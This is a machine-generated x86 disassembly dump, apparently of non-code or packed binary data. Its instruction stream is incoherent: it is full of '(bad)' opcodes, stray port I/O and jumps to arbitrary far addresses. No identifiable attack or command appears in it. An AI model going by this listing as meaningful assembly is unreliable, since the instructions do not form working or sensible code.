  416194:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416196:	mov    eax,0xc255a3ab
  41619b:	inc    esi
  41619c:	push   edx
  41619d:	gs (bad) 
  41619f:	xchg   BYTE PTR [ecx+0x56041073],bl
  4161a5:	add    BYTE PTR [ecx-0xf149db0],dl
  4161ab:	jecxz  0x416183
  4161ad:	pop    esi
  4161ae:	sub    al,0xba
  4161b0:	in     al,0x99
  4161b2:	in     eax,0xca
  4161b4:	cmp    ch,al
  4161b6:	cmp    ecx,DWORD PTR [esi]
  4161b8:	fidivr WORD PTR [ecx+0x6de8ca0e]
  4161be:	pushf  
  4161bf:	outs   dx,BYTE PTR ds:[esi]
  4161c0:	xchg   edi,eax
  4161c1:	mov    ds:0xb692171a,eax
  4161c6:	sahf   
  4161c7:	mov    es,WORD PTR [ebx]
  4161c9:	rol    DWORD PTR [ebp-0x68],1
  4161cc:	fst    DWORD PTR [eax+edi*2]
  4161cf:	js     0x41624a
  4161d1:	out    dx,eax
  4161d2:	bndldx bnd3,[esi+0x20]
  4161d6:	pop    edi
  4161d7:	repz mov bl,0xa0
  4161da:	push   eax
  4161db:	mov    ch,0x2c
  4161dd:	inc    ebp
  4161de:	adc    eax,0xaa86744a
  4161e3:	pusha  
  4161e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161e5:	xchg   edx,eax
  4161e6:	ja     0x41624c
  4161e8:	add    dl,BYTE PTR [ebp-0x5e95c438]
  4161ee:	out    dx,al
  4161ef:	jns    0x4161a8
  4161f1:	inc    ebx
  4161f2:	inc    edi
  4161f3:	rol    DWORD PTR [esi+0x5c],0x52
  4161f7:	xor    edi,DWORD PTR [ebp-0x422cc628]
  4161fd:	mov    ah,0x9b
  4161ff:	push   ecx
  416200:	imul   ecx,eax,0xffffff8e
  416203:	not    bh
  416205:	cmc    
  416206:	test   eax,0xa005ccd
  41620b:	gs add dl,al
  41620e:	inc    ecx
  41620f:	dec    eax
  416210:	hlt    
  416211:	xlat   BYTE PTR ds:[ebx]
  416212:	sbb    al,0xa
  416214:	arpl   WORD PTR [ecx+esi*8+0x32],ax
  416218:	jl     0x416237
  41621a:	adc    ebp,DWORD PTR [ecx]
  41621c:	pusha  
  41621d:	jmp    0x416213
  41621f:	or     BYTE PTR [esi-0x2621744a],dl
  416225:	or     eax,DWORD PTR [ecx]
  416227:	out    0xff,al
  416229:	push   ecx
  41622a:	jae    0x4161e0
  41622c:	sub    DWORD PTR [edi+0x7f],ebx
  41622f:	cmp    ecx,edi
  416231:	mov    eax,DWORD PTR [ebp+0x1b99]
	...
  416293:	add    BYTE PTR [eax],al
  416295:	add    BYTE PTR [ebx],ah
  416297:	outs   dx,BYTE PTR ds:[esi]
  416298:	xor    ah,BYTE PTR ds:0x6e377d7f
  41629e:	test   BYTE PTR [esi+0x196af6de],bh
  4162a4:	arpl   WORD PTR [ebp+edx*4-0x19],bp
  4162a8:	add    BYTE PTR [eax],al
  4162aa:	pop    es
  4162ab:	add    DWORD PTR [eax],eax
  4162ad:	add    bl,bh
  4162af:	push   ss
  4162b0:	aaa    
  4162b1:	dec    edx
  4162b3:	fs cli 
  4162b5:	inc    ebx
  4162b6:	icebp  
  4162b7:	xor    esi,DWORD PTR [edx+0x5d7351a5]
  4162bd:	inc    ecx
  4162be:	mov    eax,0xb0bb763c
  4162c3:	rcl    edx,1
  4162c5:	inc    edi
  4162c6:	and    ch,BYTE PTR [edx+0x7]
  4162c9:	enter  0xf719,0x11
  4162cd:	scas   al,BYTE PTR es:[edi]
  4162ce:	rcl    BYTE PTR [esi-0x2c],1
  4162d1:	cdq    
  4162d2:	mov    WORD PTR [esi+eiz*2+0x4801455c],gs
  4162d9:	add    dh,bh
  4162db:	adc    DWORD PTR [ebp-0x475fbcdf],0x1b4038fd
  4162e5:	pop    ebp
  4162e6:	sbb    al,0x8e
  4162e8:	sbb    DWORD PTR [ebp+0x2a556378],edx
  4162ee:	mov    ds:0xe3696f0,eax
  4162f3:	sub    bl,ah
  4162f5:	in     eax,dx
  4162f6:	xor    al,BYTE PTR [ebx]
  4162f8:	(bad)  
  4162f9:	(bad)  
  4162fa:	adc    BYTE PTR [ecx-0x35],dl
  4162fd:	call   0xd090:0x5fadee72
  416304:	jb     0x416333
  416306:	js     0x4162e7
  416308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416309:	jb     0x41632b
  41630b:	adc    ah,BYTE PTR [edx-0x64856f62]
  416311:	aad    0xe
  416313:	push   eax
  416314:	sub    eax,0xaa195e95
  416319:	jbe    0x4162a1
  41631b:	xchg   edi,eax
  41631c:	xchg   edi,eax
  41631d:	sbb    DWORD PTR [ebp+eiz*1+0x19],eax
  416321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416322:	out    dx,al
  416323:	ficom  DWORD PTR [edi-0x2d7cf688]
  416329:	jp     0x416397
  41632b:	scas   al,BYTE PTR es:[edi]
  41632c:	jnp    0x416311
  41632e:	shl    DWORD PTR [eax+0x42b605e5],0xa6
  416335:	popf   
  416336:	adc    BYTE PTR [edi],dh
  416338:	add    ah,BYTE PTR [esi-0x50]
  41633b:	scas   al,BYTE PTR es:[edi]
  41633c:	stos   DWORD PTR es:[edi],eax
  41633d:	(bad)  
  41633e:	pop    edi
  41633f:	ins    BYTE PTR es:[edi],dx
  416340:	scas   eax,DWORD PTR es:[edi]
  416341:	pop    ebp
  416342:	adc    edi,DWORD PTR [edi+0x23]
  416345:	mov    edi,0x23bd5fcd
  41634a:	sub    BYTE PTR [ebx+0x37],0x8c
  41634e:	and    BYTE PTR [ebp+0x28531684],dh
  416354:	mov    WORD PTR [esi+0x77],ds
  416357:	std    
  416358:	jmp    0x3c7c:0xa0ceb690
  41635f:	sub    dl,bh
  416361:	pop    ecx
  416362:	dec    edi
  416363:	mov    ds:0x1836f4f9,eax
  416368:	pop    edx
  416369:	jb     0x41634e
  41636b:	inc    ebp
  41636c:	aad    0x87
  41636e:	cld    
  41636f:	dec    edi
  416370:	pop    ds
  416371:	stc    
  416372:	jl     0x41631c
  416374:	xor    ah,0x4e
  416377:	sub    ebp,DWORD PTR [edx+ebp*8+0x68]
  41637b:	cmp    al,0x4a
  41637d:	leave  
  41637e:	xchg   esi,eax
  41637f:	dec    ebp
  416380:	mov    cl,0xc7
  416382:	cmp    al,0xb2
  416384:	aam    0x2
  416386:	cs (bad) 
  416388:	int    0x17
  41638a:	(bad)  
  41638b:	xchg   ebp,eax
  41638c:	sub    eax,DWORD PTR [eax+0x34]
  41638f:	rcl    DWORD PTR [eax],1
  416391:	mov    ecx,0xa1a38359
  416396:	add    al,0xc7
  416398:	mov    DWORD PTR [ebp-0x51d20fa2],edi
  41639e:	repz loop 0x416379
  4163a1:	(bad)  
  4163a2:	jnp    0x4163e3
  4163a4:	nop
  4163a5:	into   
  4163a6:	add    al,0xd9
  4163a8:	mov    ah,ch
  4163aa:	pop    eax
  4163ab:	xchg   esp,ecx
  4163ad:	not    BYTE PTR [ebx-0x35]
  4163b0:	in     al,dx
  4163b1:	js     0x416388
  4163b3:	add    eax,0xee
	...
  416414:	add    BYTE PTR [eax],al
  416416:	repz inc ebx
  416418:	ror    cl,1
  41641a:	lock (bad) 
  41641d:	jnp    0x416481
  41641f:	xchg   esi,eax
  416420:	cmp    DWORD PTR [ebp+0x710e6d4],edx
  416426:	pushf  
  416427:	call   0x148642c
  41642c:	add    BYTE PTR [eax],al
  41642e:	inc    BYTE PTR [esi]
  416430:	and    edi,DWORD PTR [eax]
  416432:	add    DWORD PTR [edi-0x18],esp
  416435:	into   
  416436:	loop   0x416483
  416438:	add    ebx,DWORD PTR [edx]
  41643a:	jl     0x41642f
  41643c:	ins    BYTE PTR es:[edi],dx
  41643d:	mov    ebx,0x4680d9ca
  416442:	mov    esp,0x7fc8b6f1
  416447:	int3   
  416448:	xchg   ebp,ebx
  41644a:	dec    ebx
  41644b:	jmp    0xee12:0xd4f07427
  416452:	push   edi
  416453:	mov    DWORD PTR [edi-0x5d],ebx
  416456:	pop    ebx
  416457:	add    eax,0x67df080f
  41645c:	outs   dx,BYTE PTR ds:[esi]
  41645d:	mov    bl,0xe7
  41645f:	stc    
  416460:	mov    edx,0xa21cbbba
  416465:	dec    ebx
  416466:	jmp    0xd089:0x5c0f57c8
  41646d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41646e:	mov    edi,0xafaa9f74
  416473:	fcom   DWORD PTR [eax-0x78]
  416476:	sbb    dh,BYTE PTR [ebx+0x48]
  416479:	fs outs dx,DWORD PTR ss:[esi]
  41647c:	fnstenv [edi+ebx*4]
  41647f:	push   ss
  416480:	and    ecx,esi
  416482:	xchg   ebx,eax
  416483:	cmp    BYTE PTR [edx+0x6b],dl
  416486:	imul   edi,DWORD PTR [edi+0x57],0x1340424f
  41648d:	inc    esi
  41648e:	outs   dx,DWORD PTR ds:[esi]
  41648f:	xor    BYTE PTR [ebp+0x3ee86e15],ah
  416495:	xor    ebx,DWORD PTR [ebp+0x9]
  416498:	fsubr  DWORD PTR [ecx-0xb99ffb0]
  41649e:	add    dl,bl
  4164a0:	std    
  4164a1:	push   esp
  4164a2:	push   ecx
  4164a3:	stos   BYTE PTR es:[edi],al
  4164a4:	lods   al,BYTE PTR ds:[esi]
  4164a5:	mov    ds:0x82233b81,eax
  4164aa:	sbb    eax,0x4d4bcd14
  4164af:	test   al,0xc4
  4164b1:	xchg   BYTE PTR [ebp+0x46],dh
  4164b4:	int3   
  4164b5:	mov    esp,DWORD PTR [edi+edi*4]
  4164b8:	mov    DWORD PTR [ecx],edi
  4164ba:	repz or DWORD PTR gs:[ebp+edi*2+0x608ec71a],edi
  4164c3:	ja     0x4164d7
  4164c5:	and    eax,0x15b744aa
  4164ca:	pusha  
  4164cb:	out    dx,eax
  4164cc:	or     eax,esi
  4164ce:	aaa    
  4164cf:	adc    BYTE PTR [eax],cl
  4164d1:	aaa    
  4164d2:	or     al,0x9a
  4164d4:	ror    DWORD PTR [ebx],1
  4164d6:	xchg   BYTE PTR [ebx+0x1e825982],ah
  4164dc:	jmp    0x416528
  4164de:	aas    
  4164df:	add    BYTE PTR [edi+0x47e3dd4d],ch
  4164e5:	adc    esi,edx
  4164e7:	aas    
  4164e8:	mov    eax,0xbe81b052
  4164ed:	sbb    DWORD PTR [eax-0x1d493989],eax
  4164f3:	int    0xf2
  4164f5:	push   ss
  4164f6:	daa    
  4164f7:	stc    
  4164f8:	loopne 0x41649e
  4164fa:	in     al,dx
  4164fb:	lock dec ebx
  4164fd:	(bad)  
  4164fe:	out    0xc9,al
  416500:	call   0x17ee60de
  416505:	mov    ch,0x1d
  416507:	fstp   TBYTE PTR [edx-0x3b]
  41650a:	outs   dx,BYTE PTR ds:[esi]
  41650b:	fst    QWORD PTR [edi+0x4d56e639]
  416511:	mov    ebx,0xcc6970ee
  416516:	jmp    0x70e5d68
  41651b:	call   0x62cc:0x404c2259
  416522:	push   ebx
  416523:	xchg   DWORD PTR [esi+0x13],ebp
  416526:	lea    esp,[ecx+0x4e15b08f]
  41652c:	fld    QWORD PTR [ebx+0x2c924b64]
  416532:	dec    ecx
  416533:	dec    ebx
  416534:	xor    eax,0x0
	...
  416595:	add    BYTE PTR ds:0xfff32bd8,ah
  41659b:	repz std 
  41659d:	fisubr WORD PTR [edi+ebp*1+0x72]
  4165a1:	jno    0x4165ce
  4165a3:	pop    ss
  4165a4:	lods   eax,DWORD PTR ds:[esi]
  4165a5:	jns    0x41654a
  4165a7:	jmp    0x14865ac
  4165ac:	add    BYTE PTR [eax],al
  4165ae:	mov    ah,0xdd
  4165b0:	or     esi,DWORD PTR [ebx]
  4165b2:	out    dx,eax
  4165b3:	shl    DWORD PTR [eax],0x2f
  4165b6:	push   ebx
  4165b7:	(bad)  
  4165b8:	(bad)  
  4165b9:	lea    ecx,[edi]
  4165bb:	dec    ebx
  4165bc:	mov    edx,0x1bd8b98
  4165c1:	out    0x24,eax
  4165c3:	push   ecx
  4165c4:	cs mov ah,0xf8
  4165c7:	dec    ecx
  4165c8:	retf   0xf398
  4165cb:	clc    
  4165cc:	dec    edx
  4165cd:	pop    ecx
  4165ce:	sti    
  4165cf:	sahf   
  4165d0:	push   ss
  4165d1:	scas   al,BYTE PTR es:[edi]
  4165d2:	inc    ebx
  4165d3:	mov    edi,0xe966d427
  4165d8:	ror    ecx,cl
  4165da:	jg     0x4165f7
  4165dc:	cdq    
  4165dd:	or     cl,cl
  4165df:	or     BYTE PTR [ecx+ebp*4],ch
  4165e2:	call   DWORD PTR [edx]
  4165e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165e5:	mov    dh,0x26
  4165e7:	push   ebx
  4165e8:	bound  esp,QWORD PTR [esi-0x617641df]
  4165ee:	adc    BYTE PTR [ebx+0x4e93dcd8],al
  4165f4:	mov    ebx,0xfb243006
  4165f9:	pop    eax
  4165fa:	ins    DWORD PTR es:[edi],dx
  4165fb:	add    eax,esp
  4165fd:	ret    
  4165fe:	sub    BYTE PTR [esi],al
  416600:	ins    BYTE PTR es:[edi],dx
  416601:	stc    
  416602:	cli    
  416603:	lods   eax,DWORD PTR ds:[esi]
  416604:	add    DWORD PTR [edi+edx*8],esi
  416607:	jg     0x41663d
  416609:	(bad)  
  41660a:	(bad)  
  41660b:	dec    ebp
  41660c:	sbb    cl,BYTE PTR [ebx]
  41660e:	inc    ebp
  41660f:	mov    ebx,0xfa462c75
  416614:	int3   
  416615:	and    al,0xf
  416617:	sub    BYTE PTR [esi],dl
  416619:	and    bh,BYTE PTR [edx+0x2b]
  41661c:	push   eax
  41661d:	push   esi
  41661e:	test   BYTE PTR [edi-0x7b],ah
  416621:	and    BYTE PTR [ebp-0x70fe5da8],ah
  416627:	sub    esi,DWORD PTR [esi]
  416629:	das    
  41662a:	and    eax,0x1b1507ff
  41662f:	test   al,0xfe
  416631:	dec    ebx
  416632:	push   0x65
  416634:	sbb    al,0x83
  416636:	shl    DWORD PTR [ecx],0x96
  416639:	mov    WORD PTR [esi+0x7a],ds
  41663c:	into   
  41663d:	push   0xfffffff0
  41663f:	sbb    cl,BYTE PTR [ebx]
  416641:	sub    edi,ebx
  416643:	push   cs
  416644:	enter  0x2d9b,0xb8
  416648:	push   cs
  416649:	cli    
  41664a:	ins    BYTE PTR es:[edi],dx
  41664b:	mov    ebx,0x9a68f855
  416650:	(bad)  
  416651:	sbb    eax,0x29f56bef
  416656:	fwait
  416657:	push   0xffffffc3
  416659:	int3   
  41665a:	test   DWORD PTR [esi],ebx
  41665c:	scas   al,BYTE PTR es:[edi]
  41665d:	push   0x74100b42
  416662:	fisttp QWORD PTR [esi-0x1a]
  416665:	xchg   ecx,eax
  416666:	rcr    DWORD PTR [esi],0x9a
  416669:	push   ecx
  41666a:	clc    
  41666b:	iret   
  41666c:	dec    eax
  41666d:	pop    esi
  41666e:	jno    0x4166e4
  416670:	out    0x6f,al
  416672:	or     eax,0xfa8f493d
  416677:	ret    0x3cc6
  41667a:	loop   0x416641
  41667c:	jno    0x4166b1
  41667e:	ret    0x6b85
  416681:	test   BYTE PTR [esi-0x293c71e9],0x3
  416688:	add    dl,BYTE PTR [edx+0x46]
  41668b:	jbe    0x4166ca
  41668d:	ficom  WORD PTR [ecx]
  41668f:	mov    bh,BYTE PTR [eax-0x28]
  416692:	sub    dh,bl
  416694:	dec    eax
  416695:	rcl    ecx,0xcc
  416698:	xor    DWORD PTR [eax],ecx
  41669a:	rol    BYTE PTR [ecx-0x6b408c47],0x1f
  4166a1:	sbb    eax,0xe41cd129
  4166a6:	ja     0x41665d
  4166a8:	xlat   BYTE PTR ds:[ebx]
  4166a9:	ret    
  4166aa:	push   es
  4166ab:	ds leave 
  4166ad:	ja     0x4166a8
  4166af:	ds js  0x416634
  4166b2:	push   cs
  4166b3:	dec    eax
  4166b4:	data16 add BYTE PTR [eax],al
	...
  416713:	add    BYTE PTR [eax],al
  416715:	add    ah,al
  416717:	(bad)  
  416719:	(bad)  
  41671a:	(bad)  
  41671c:	out    0xff,eax
  41671e:	mov    ah,0x10
  416720:	mov    cl,0x4f
  416722:	jbe    0x416725
  416724:	xlat   BYTE PTR ds:[ebx]
  416725:	clc    
  416726:	stos   BYTE PTR es:[edi],al
  416727:	jmp    0x0:0x1070000
  41672e:	and    BYTE PTR [edi-0x19],bl
  416731:	in     eax,dx
  416732:	push   ds
  416733:	jae    0x416761
  416735:	push   edi
  416736:	aam    0x6a
  416738:	sub    edi,ecx
  41673a:	pop    esi
  41673b:	and    eax,0xbc9cb998
  416740:	outs   dx,DWORD PTR ds:[esi]
  416741:	repz push ax
  416744:	xchg   esp,eax
  416745:	jno    0x416726
  416747:	inc    edi
  416748:	sbb    ah,BYTE PTR cs:[edx-0x2e79f076]
  41674f:	fdivr  st,st(6)
  416751:	xchg   ecx,eax
  416752:	adc    edi,DWORD PTR [edx+esi*8+0x7f]
  416756:	adc    ebx,DWORD PTR [eax+0x79]
  416759:	rcl    BYTE PTR [ecx-0x25],cl
  41675c:	add    bh,BYTE PTR [edx]
  41675e:	enter  0xe9ec,0x93
  416762:	aad    0x31
  416764:	add    ch,BYTE PTR [ebx+eax*1]
  416767:	adc    ah,bl
  416769:	mov    dl,0x8e
  41676b:	test   DWORD PTR [ebp+0x25],eax
  41676e:	fild   WORD PTR [ecx]
  416770:	(bad)  
  416771:	repz pop ebx
  416773:	mov    ah,0xec
  416775:	lea    esp,[edx-0x27]
  416778:	call   0xd40ee55f
  41677d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41677e:	add    DWORD PTR [ebx-0x129ec121],eax
  416784:	add    ecx,DWORD PTR [eax+0x61]
  416787:	ja     0x416727
  416789:	int3   
  41678a:	loopne 0x416803
  41678c:	push   esi
  41678d:	push   cs
  41678e:	fst    QWORD PTR [eax]
  416790:	aaa    
  416791:	push   es
  416792:	adc    eax,0xe9748bc
  416797:	test   bl,dh
  416799:	cs mov dl,0xa4
  41679c:	sti    
  41679d:	pop    es
  41679e:	or     BYTE PTR [ecx],ah
  4167a0:	retf   0xfce0
  4167a3:	fwait
  4167a4:	jecxz  0x4167a5
  4167a6:	sbb    bl,al
  4167a8:	jne    0x4167bf
  4167aa:	or     ebx,edi
  4167ac:	mov    ah,0x69
  4167ae:	and    DWORD PTR [edx-0x485d1438],eax
  4167b4:	xor    dh,BYTE PTR [ebp+0x63]
  4167b7:	adc    eax,0x87714d66
  4167bc:	int    0x2e
  4167be:	mov    esi,0x3174ffbe
  4167c3:	sbb    ecx,DWORD PTR [ebp+0x5a7d0a2a]
  4167c9:	loope  0x4167f8
  4167cb:	push   ds
  4167cc:	mov    ebx,0xbeabc508
  4167d1:	loopne 0x41676b
  4167d3:	mov    DWORD PTR [eax+ebp*2],edi
  4167d6:	out    0xee,al
  4167d8:	sub    al,0xdd
  4167da:	pop    edx
  4167db:	cmc    
  4167dc:	inc    edi
  4167dd:	sub    dh,BYTE PTR [ebx-0x574f4c61]
  4167e3:	mov    edi,0xb06cb54e
  4167e8:	mov    WORD PTR [ecx-0x2b576594],es
  4167ee:	mov    BYTE PTR [eax],dh
  4167f0:	xchg   edi,eax
  4167f1:	sbb    ch,dh
  4167f3:	test   DWORD PTR ds:0x4f601d8d,esp
  4167f9:	scas   al,BYTE PTR es:[edi]
  4167fa:	movd   ecx,mm7
  4167fd:	and    DWORD PTR [edx],ebp
  4167ff:	(bad)  
  416800:	stc    
  416801:	mov    eax,DWORD PTR [edx+0x76]
  416804:	jp     0x41679a
  416806:	popf   
  416807:	shl    DWORD PTR [ecx+0x53],1
  41680a:	jno    0x4167c1
  41680c:	mov    esp,0x1c764570
  416811:	mov    eax,0x1fbf0ef3
  416816:	in     eax,dx
  416817:	pop    eax
  416818:	and    dh,BYTE PTR [ebp-0x144e5ca8]
  41681e:	(bad)  
  41681f:	cmp    eax,0x50dfa39c
  416824:	(bad)  
  416825:	add    BYTE PTR ds:0x217e06c2,al
  41682b:	into   
  41682c:	push   esp
  41682d:	sub    BYTE PTR [esi-0x3],ah
  416830:	cmc    
  416831:	sbb    DWORD PTR [edi],edi
  416833:	jle    0x4167ee
	...
  416895:	add    cl,dl
  416897:	scas   eax,DWORD PTR es:[edi]
  416898:	push   es
  416899:	repz jle 0x416897
  41689c:	cmc    
  41689d:	scas   eax,DWORD PTR es:[edi]
  41689e:	cwde   
  41689f:	sub    bh,al
  4168a1:	repnz mov edi,0xb12ffd11
  4168a7:	jmp    0x4168a9
  4168a9:	add    BYTE PTR [edi],al
  4168ab:	add    DWORD PTR [eax],eax
  4168ad:	add    BYTE PTR [ebx-0x790ff15f],dh
  4168b3:	mov    bl,0xf5
  4168b5:	inc    ebx
  4168b6:	xchg   edi,eax
  4168b7:	sub    eax,0x946ee079
  4168bc:	dec    esi
  4168bd:	adc    bh,ah
  4168bf:	mov    cl,0x27
  4168c1:	mov    edx,0xb93d8f90
  4168c6:	pop    ebx
  4168c7:	int    0x8d
  4168c9:	ja     0x4168b2
  4168cb:	or     esp,DWORD PTR [ebp-0x65]
  4168ce:	inc    ebp
  4168cf:	mov    eax,0xc9422253
  4168d4:	shl    BYTE PTR ds:[edx-0x15],cl
  4168d8:	mov    esi,0xb67f9078
  4168dd:	test   al,0x87
  4168df:	jl     0x416937
  4168e1:	xor    al,0x70
  4168e3:	xor    BYTE PTR [esi+0x29],cl
  4168e6:	leave  
  4168e7:	bnd jl 0x416898
  4168ea:	out    0xfd,al
  4168ec:	clc    
  4168ed:	fist   WORD PTR [eax]
  4168ef:	popa   
  4168f0:	mov    ebp,ecx
  4168f2:	ss cld 
  4168f4:	(bad)  
  4168f5:	pop    esi
  4168f6:	in     eax,0xf2
  4168f8:	or     ebp,DWORD PTR [ebp+0x8]
  4168fb:	add    BYTE PTR [ebp+0x2b],ah
  4168fe:	aas    
  4168ff:	out    0x32,eax
  416901:	jmp    0xc104:0x43c018c4
  416908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416909:	push   ds
  41690a:	push   ecx
  41690b:	push   ecx
  41690c:	in     eax,0xf1
  41690e:	ror    ebp,1
  416910:	shr    DWORD PTR [edx],cl
  416912:	xor    eax,0xffffff8b
  416915:	popa   
  416916:	mov    BYTE PTR [edx+0xec1bc68],dl
  41691c:	jae    0x416908
  41691e:	adc    DWORD PTR [edi+0x777507ff],esi
  416924:	push   edx
  416925:	dec    edi
  416926:	inc    edx
  416927:	out    dx,eax
  416928:	out    dx,al
  416929:	adc    BYTE PTR [ebx+0x4e],0x6f
  41692d:	inc    BYTE PTR ds:0x2a4d8ae4
  416933:	shl    BYTE PTR [ebx],1
  416935:	xor    DWORD PTR [ebx+0x64502c48],ecx
  41693b:	fidiv  DWORD PTR [ebp+0x35]
  41693e:	daa    
  41693f:	push   ds
  416940:	xor    ah,BYTE PTR [edi]
  416942:	dec    edx
  416943:	mov    ebx,0xf9aefc3e
  416948:	inc    esp
  416949:	test   DWORD PTR [ebx+0x3b],0x37bcba33
  416950:	add    al,0x53
  416952:	mul    BYTE PTR [edx+0x42]
  416955:	push   eax
  416956:	adc    al,0x22
  416958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416959:	mov    es,WORD PTR [ecx+eax*2-0x1]
  41695d:	cmp    BYTE PTR [esi-0x54],ah
  416960:	mov    esp,0xed0daf7c
  416965:	mov    WORD PTR [ebx],gs
  416967:	(bad)  
  416968:	mov    cl,0x27
  41696a:	outs   dx,BYTE PTR ds:[esi]
  41696b:	mov    al,ds:0x549b73c1
  416970:	cmp    al,0xae
  416972:	xor    al,0x55
  416974:	xchg   ebx,eax
  416975:	cdq    
  416976:	mov    WORD PTR ds:0x68ad3c15,ss
  41697c:	imul   esi,DWORD PTR [eax-0x6ac5bb0],0xc3980257
  416986:	inc    ebp
  416987:	daa    
  416988:	cmc    
  416989:	addr16 jb 0x4169f7
  41698c:	and    ecx,ebx
  41698e:	or     DWORD PTR [ebx-0x35d571a2],ebx
  416994:	mov    ah,0xfb
  416996:	idiv   DWORD PTR [eax+0x6e]
  416999:	popa   
  41699a:	sbb    esp,DWORD PTR [edi+0xd]
  41699d:	mov    ebp,0x5dcbb72e
  4169a2:	mov    DWORD PTR [ebp-0x44],ebp
  4169a5:	add    BYTE PTR [edi],ch
  4169a7:	add    eax,DWORD PTR [eax]
  4169a9:	xchg   ecx,eax
  4169aa:	test   al,0xac
  4169ac:	fmul   QWORD PTR [edi]
  4169ae:	mov    eax,ds:0xeba9b0e9
  4169b3:	bound  ebx,QWORD PTR [ecx+0x0]
	...
  416a15:	add    bl,cl
  416a17:	pusha  
  416a18:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a1e:	enter  0x4aea,0x13
  416a22:	and    DWORD PTR [eax+0x1],edx
  416a25:	cmp    DWORD PTR [eax+0x70000ec],0xe3000001
  416a2f:	jmp    0x416a8e
  416a31:	call   0x7f5e5d58
  416a36:	call   0xd52d:0xe93b741a
  416a3d:	dec    esi
  416a3e:	push   DWORD PTR [ecx+ecx*8]
  416a41:	call   0xfe8b:0x72c3f2a2
  416a48:	out    dx,eax
  416a49:	add    al,0xd9
  416a4b:	es mov ah,0x13
  416a4e:	sbb    eax,0xcebfe2
  416a53:	pop    esp
  416a54:	adc    eax,0xc9fefe57
  416a59:	xchg   BYTE PTR [esi-0x4b41e15f],cl
  416a5f:	pop    edx
  416a60:	adc    eax,0xe445b6dd
  416a65:	aas    
  416a66:	jecxz  0x416a38
  416a68:	inc    ecx
  416a69:	dec    eax
  416a6a:	push   ecx
  416a6b:	push   0x1caef1d1
  416a70:	mov    al,0x42
  416a72:	or     BYTE PTR [ebx-0x26],dl
  416a75:	mov    ch,0x8c
  416a77:	nop
  416a78:	fisttp QWORD PTR [esp+esi*1+0x60d182ee]
  416a7f:	je     0x416a0a
  416a81:	lods   eax,DWORD PTR ds:[esi]
  416a82:	push   ecx
  416a83:	dec    ebp
  416a84:	call   0x63663f2a
  416a89:	out    0x7a,al
  416a8b:	in     eax,dx
  416a8c:	push   ds
  416a8d:	pop    ebp
  416a8e:	pushf  
  416a8f:	rcr    BYTE PTR [eax+0x77bfc5ef],cl
  416a95:	sar    esi,0x5d
  416a98:	pop    es
  416a99:	std    
  416a9a:	ds inc ecx
  416a9c:	push   ds
  416a9d:	xor    ch,0xdd
  416aa0:	xor    dh,dl
  416aa2:	shr    esi,1
  416aa4:	pop    ebp
  416aa5:	push   ds
  416aa6:	shl    DWORD PTR [ebx+edx*4],cl
  416aa9:	sub    dl,ch
  416aab:	rol    BYTE PTR [ebx-0x16c15a46],0x53
  416ab2:	mov    cl,0xa6
  416ab4:	push   cs
  416ab5:	add    BYTE PTR [esi+0x77],0x2
  416ab9:	in     al,0x6f
  416abb:	sbb    DWORD PTR [ebx-0x34515fbc],esp
  416ac1:	imul   ebp,DWORD PTR [ebp+0x62d0117c],0xfffffff8
  416ac8:	push   es
  416ac9:	test   al,0x6e
  416acb:	pop    esp
  416acc:	cmp    al,0x80
  416ace:	inc    ebp
  416acf:	inc    esp
  416ad0:	pop    ebp
  416ad1:	jno    0x416a8d
  416ad3:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  416ad5:	mov    ah,0x88
  416ad7:	pushf  
  416ad8:	inc    edx
  416ad9:	imul   edx,esi,0x44
  416adc:	dec    ecx
  416ade:	add    eax,0x5f0b57dd
  416ae3:	out    0x8f,eax
  416ae5:	mov    ebx,0x9631ab7d
  416aea:	sbb    ecx,DWORD PTR [eax+eiz*1-0x77]
  416aee:	dec    ebx
  416aef:	push   edi
  416af0:	jge    0x416b46
  416af2:	sbb    al,0x6d
  416af4:	xchg   edx,eax
  416af5:	cld    
  416af6:	cmp    dl,al
  416af8:	outs   dx,BYTE PTR ds:[esi]
  416af9:	int    0xc1
  416afb:	scas   eax,DWORD PTR es:[edi]
  416afc:	lods   eax,DWORD PTR ds:[esi]
  416afd:	pushf  
  416afe:	cmp    eax,0x13f1aa0f
  416b03:	and    DWORD PTR [edx],ecx
  416b05:	sahf   
  416b06:	sub    bh,cl
  416b08:	out    dx,eax
  416b09:	jecxz  0x416b32
  416b0b:	jne    0x416aa9
  416b0d:	mov    esi,DWORD PTR [edx-0x36]
  416b10:	sbb    al,0xdf
  416b12:	push   0xd57b8170
  416b17:	inc    edi
  416b18:	sub    eax,0x53477ca7
  416b1d:	inc    edx
  416b1e:	shl    BYTE PTR [ecx+0x29],cl
  416b21:	fcom   QWORD PTR [esi+0x3e]
  416b24:	sub    BYTE PTR [ecx+0x1316ec2a],bl
  416b2a:	sar    DWORD PTR [ebx+0x4e48c797],cl
  416b30:	in     eax,0x2f
  416b32:	mov    ebx,0xcf02
	...
  416b93:	add    BYTE PTR [eax],al
  416b95:	add    bl,ah
  416b97:	gs push cs
  416b99:	test   DWORD PTR [esi+0x1275fbff],0x2ca56b6b
  416ba3:	or     BYTE PTR [eax],ch
  416ba5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ba6:	mov    edi,0x70000ed
  416bab:	add    DWORD PTR [eax],eax
  416bad:	add    BYTE PTR [ecx],al
  416baf:	push   edi
  416bb0:	mov    ecx,0x3113eb41
  416bb5:	je     0x416b4d
  416bb7:	lahf   
  416bb8:	mov    DWORD PTR [eax],edi
  416bba:	imul   esp,DWORD PTR [ebx+0x2d],0xc2be5009
  416bc1:	inc    esp
  416bc2:	jle    0x416bca
  416bc4:	imul   edi,DWORD PTR [ebx-0x68],0xfca92359
  416bcb:	jbe    0x416bef
  416bcd:	add    bl,BYTE PTR [edx]
  416bcf:	cmc    
  416bd0:	xchg   BYTE PTR [ebx],ah
  416bd2:	xchg   edx,eax
  416bd3:	iret   
